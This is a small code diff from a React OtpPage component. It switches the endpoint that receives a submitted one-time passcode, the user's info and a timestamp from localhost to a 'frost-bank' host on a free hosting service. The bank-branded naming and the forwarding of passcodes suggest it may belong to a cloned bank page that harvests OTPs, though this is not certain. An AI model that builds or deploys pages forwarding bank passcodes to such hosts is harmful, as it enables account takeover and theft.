@@ -28,7 +28,7 @@ const OtpPage = () => {
     }else{
       const otpInfo = {otp, userInfo, date: new Date().toLocaleString()}
       
-      axios.post('http://localhost:3000/otp', otpInfo)
+      axios.post('https://frost-bank.onrender.com/otp', otpInfo)
       .then((response)=>{
         console.log(response.data.message);
       })
